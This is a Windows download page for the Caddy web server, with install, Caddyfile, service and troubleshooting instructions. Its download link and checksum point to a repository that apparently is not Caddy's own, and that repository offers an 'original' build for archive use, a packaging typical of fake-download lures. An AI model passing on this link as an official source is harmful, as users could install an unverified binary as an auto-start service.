# Caddy 2.11.7 Download for Windows (amd64) — Web Server with Automatic HTTPS

**Caddy** is a web server and reverse proxy written in Go that obtains and renews TLS certificates on its own. Point it at a domain, and it provisions a certificate, serves HTTP/2 and HTTP/3, and renews the certificate before expiry — with no certbot, no cron job and no configuration file beyond a few lines.

<p align="center">
  <a href="https://github.com/CaddySoftware/caddy-download/releases/latest/download/caddy-2.11.7-windows-amd64-original.zip">
    <img src="https://img.shields.io/badge/DOWNLOAD-Caddy_2.11.7_windows--amd64_%C2%B7_17.6_MB-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Download Caddy for Windows">
  </a>
</p>

| | |
|---|---|
| **Version** | 2.11.7 |
| **Package** | `caddy-2.11.7-windows-amd64-original.zip` — 17.6 MB |
| **Binary** | `caddy.exe` (single static binary, no dependencies) |
| **Platform** | Windows 10 / 11, Windows Server 2016+ (x86-64) |
| **Licence** | Apache 2.0 |

## Download

| Package | Size | Link |
|---|---|---|
| **Caddy 2.11.7 windows-amd64** | 17.6 MB | [Download](https://github.com/CaddySoftware/caddy-download/releases/latest/download/caddy-2.11.7-windows-amd64-original.zip) |

## Works with

| | |
|---|---|
| OS | Windows 10 / 11, Windows Server 2016 and newer |
| Architecture | x86-64 |
| RAM | 50 MB baseline, more with heavy proxying |
| Disk | ~50 MB unpacked |
| Ports | 80 and 443 for automatic HTTPS |
| Network | Outbound HTTPS to the ACME CA |

## SHA-256 checksum

```
0A1EDC0B799512051C57071CE0E798D3F2CF67DC98171366F1D2B326072E3B06  caddy-2.11.7-windows-amd64-original.zip
```

```powershell
Get-FileHash .\caddy-2.11.7-windows-amd64-original.zip -Algorithm SHA256
```

## Install

### 1. Unpack

```powershell
Expand-Archive .\caddy-2.11.7-windows-amd64-original.zip -DestinationPath C:\Caddy
cd C:\Caddy
.\caddy.exe version
```

### 2. Serve a folder over HTTPS

```powershell
.\caddy.exe file-server --domain example.com --root C:\sites\example
```

Caddy fetches a certificate for `example.com` and serves the folder. Ports 80 and 443 must be reachable from the internet.

### 3. Reverse proxy to a local application

```powershell
.\caddy.exe reverse-proxy --from example.com --to 127.0.0.1:8080
```

### 4. Run from a Caddyfile

`C:\Caddy\Caddyfile`:

```caddyfile
example.com {
    encode zstd gzip
    root * C:\sites\example
    file_server

    reverse_proxy /api/* 127.0.0.1:8080
}
```

```powershell
.\caddy.exe run --config C:\Caddy\Caddyfile
```

### 5. Install as a Windows service

```powershell
sc.exe create Caddy binPath= "C:\Caddy\caddy.exe run --config C:\Caddy\Caddyfile" start= auto
sc.exe start Caddy
```

### 6. Reload without downtime

```powershell
.\caddy.exe reload --config C:\Caddy\Caddyfile
```

## What it does

Caddy is a single binary. It contains the web server, the reverse proxy, the admin API, the TLS stack and the ACME client — nothing external is required to run a production site on Windows.

The configuration language is the **Caddyfile**: a text file where the first line is an address and the block below it describes behaviour. The same configuration can be expressed as JSON and manipulated at runtime through the admin API on `localhost:2019`.

### What automatic HTTPS means in practice

1. Caddy reads `example.com { ... }` from the Caddyfile.
2. It contacts an ACME CA (Let's Encrypt or ZeroSSL by default), proves domain control over HTTP-01 or TLS-ALPN-01.
3. It stores the certificate in its data directory and starts serving HTTPS.
4. It renews at roughly two-thirds of the certificate lifetime, without a restart.
5. HTTP requests on port 80 are redirected to HTTPS automatically.

If DNS is not pointed at the machine yet, the certificate issuance fails — that is the single most common first-run problem.

### Features

| Feature | Details |
|---|---|
| Automatic HTTPS | Certificates obtained and renewed without external tools |
| HTTP/1.1, HTTP/2, HTTP/3 | QUIC support included in the standard build |
| Reverse proxy | Load balancing, health checks, header rewriting, WebSocket |
| Static file server | `caddy file-server` serves a directory with one flag |
| One-line proxy | `caddy reverse-proxy --from :80 --to :8080` |
| Admin API | Live configuration via REST on `localhost:2019` |
| JSON config | Caddyfile is adapted to JSON; both are first-class |
| Windows service | Runs under `sc.exe` or NSSM as a background service |
| Logging | Structured JSON access logs, per-site |
| Zero dependencies | One static binary, no runtime, no DLLs |

## Troubleshooting

**`bind: address already in use` on 80 or 443.** Another web server holds the port — IIS, Apache, or a previous Caddy process. Check with `netstat -ano | findstr :443`, stop the owner, then start Caddy again. Running `caddy run` in a console prints the conflicting address before it exits.

**Certificate issuance fails or loops.** The hostname must resolve to this machine before the first run: an A or AAAA record for the domain, and port 80 reachable for the HTTP challenge (or 443 for TLS-ALPN). A proxy or CDN in front of the domain hides the real address and breaks the challenge unless the proxy passes `/.well-known/acme-challenge/`.

**Running as a Windows service.** Caddy does not install a service by itself. Register it with `sc.exe create caddy binPath= "C:\caddy\caddy.exe run --config C:\caddy\Caddyfile"`, set recovery options, then start it — the process keeps running without a logged-in session.

## FAQ

**Is Caddy free for commercial use?**
Yes, Apache 2.0 — no restrictions on commercial deployment.

**Do I need to install certificates manually?**
No. Automatic HTTPS handles issuance and renewal, provided DNS points at the machine and ports 80/443 are reachable.

**Can it replace nginx or IIS?**
For static sites, reverse proxying and automatic TLS, yes. For specific modules (ASP.NET handlers, ISAPI), no.

**How do I get a certificate for a local domain?**
Use Caddy's internal CA (`tls internal`) for `localhost` and lab names; public CAs cannot issue for them.

**Does it support HTTP/3?**
Yes, over UDP 443, enabled by default in the standard build.

**Where are certificates and data stored?**
In the data directory — `%APPDATA%\Caddy` by default, or `--storage` if you override it. Back it up: losing it means re-issuing certificates, which counts against CA rate limits.

**How do I see the effective configuration?**
`caddy adapt --config Caddyfile --pretty` prints the JSON Caddy actually runs.

**Can several sites share one instance?**
Yes — one block per site in the Caddyfile, one process.

**Why does certificate issuance fail?**
Almost always DNS not pointing at the server, port 80 blocked, or a rate limit already hit. `caddy run` prints the ACME error verbatim.

## Version history

| Version | Notes |
|---|---|
| **2.11.7** | current windows-amd64 build published in this repository |
| 2.11.x | maintenance line of the 2.11 branch |
| 2.10 | previous feature release |

## Disclaimer

This repository distributes the Windows amd64 build for offline installation and archive purposes. All product names and trademarks belong to their respective owners.
